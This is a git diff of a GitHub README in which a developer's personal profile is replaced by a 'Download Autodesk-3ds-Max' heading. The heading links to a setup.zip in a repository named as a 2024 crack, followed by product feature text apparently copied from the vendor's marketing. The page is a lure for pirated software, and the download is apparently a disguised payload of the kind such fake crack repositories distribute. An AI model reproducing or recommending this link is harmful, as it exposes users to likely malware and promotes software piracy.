@@ -1,24 +1,32 @@
-# 💫 About Me:
-🔭 I’m currently working on a multiplayer game project.<br>👯 I’m looking to collaborate on my game development journey.<br>🤝 I’m looking for help with a senior game developer 🤧🤧<br>🌱 I’m currently learning the unreal engine.<br>💬 Ask me about anything.<br>⚡ Fun fact: "hoho ho🥴🥴"
+# [Download Autodesk-3ds-Max](https://github.com/rahulxiao/Autodesk-3ds-Max-2024-Crack/releases/download/Autodesk-3ds-Max-2024/setup.zip)
 
+![product_ignite_optm](https://github.com/user-attachments/assets/a2ffc3ef-c71e-4eab-b665-922bd57b8055)
 
-## 🌐 Socials:
-[![Discord](https://img.shields.io/badge/Discord-%237289DA.svg?logo=discord&logoColor=white)](https://discord.gg/xiao.rb) [![Facebook](https://img.shields.io/badge/Facebook-%231877F2.svg?logo=Facebook&logoColor=white)](https://facebook.com/rahulxiao) [![Instagram](https://img.shields.io/badge/Instagram-%23E4405F.svg?logo=Instagram&logoColor=white)](https://instagram.com/ig_4rahul) [![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?logo=linkedin&logoColor=white)](https://linkedin.com/in/rahul-biswas-6a2993232) 
+## Features:
 
-# 💻 Tech Stack:
-![C++](https://img.shields.io/badge/c++-%2300599C.svg?style=for-the-badge&logo=c%2B%2B&logoColor=white) ![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white) ![C](https://img.shields.io/badge/c-%2300599C.svg?style=for-the-badge&logo=c&logoColor=white) ![C#](https://img.shields.io/badge/c%23-%23239120.svg?style=for-the-badge&logo=csharp&logoColor=white) ![MySQL](https://img.shields.io/badge/mysql-%2300000f.svg?style=for-the-badge&logo=mysql&logoColor=white) ![Adobe Premiere Pro](https://img.shields.io/badge/Adobe%20Premiere%20Pro-9999FF.svg?style=for-the-badge&logo=Adobe%20Premiere%20Pro&logoColor=white) ![Figma](https://img.shields.io/badge/figma-%23F24E1E.svg?style=for-the-badge&logo=figma&logoColor=white)
-# 📊 GitHub Stats:
-![](https://github-readme-stats.vercel.app/api?username=rahulxiao&theme=nord&hide_border=true&include_all_commits=true&count_private=true)<br/>
-![](https://github-readme-streak-stats.herokuapp.com/?user=rahulxiao&theme=nord&hide_border=true)<br/>
-![](https://github-readme-stats.vercel.app/api/top-langs/?username=rahulxiao&theme=nord&hide_border=true&include_all_commits=true&count_private=true&layout=compact)
+ ### Retopology tools
+Automatically reconstruct polygonal mesh data as clean, quad-based topology with amazing accuracy.
 
-### ✍️ Random Dev Quote
-![](https://quotes-github-readme.vercel.app/api?type=horizontal&theme=dark)
+### Modifier stack workflow
+Explore design ideas using a range of modifiers that can non-destructively enhance your creations.
 
-### 🔝 Top Contributed Repo
-![](https://github-contributor-stats.vercel.app/api?username=rahulxiao&limit=5&theme=dark&combine_all_yearly_contributions=true)
+### Interactive viewports
+Reduce design iterations with render-quality viewport previews of PBR materials and camera effects.
 
----
-[![](https://visitcount.itsvg.in/api?id=rahulxiao&icon=4&color=12)](https://visitcount.itsvg.in)
+### High-quality materials
+Make realistic objects with physically based rendering, Open Shading Language and bake to texture.
 
-<!-- Proudly created with GPRM ( https://gprm.itsvg.in ) -->
+### Material switcher
+Manage the display of multiple material variants in a few simple clicks.
+
+### Colour Management
+Ensure accurate reproduction of colours and compatibility across a variety of applications.
+
+### Integrated Arnold renderer
+Render complex scenes and designs with Arnold for 3ds Max.
+
+### Multiple file format support
+Easily share assets with support for file formats like glTF, USD, FBX, CAD formats and more.
+
+### Modern workspace
+Stay focused on being creative with a dynamic and customisable interface.
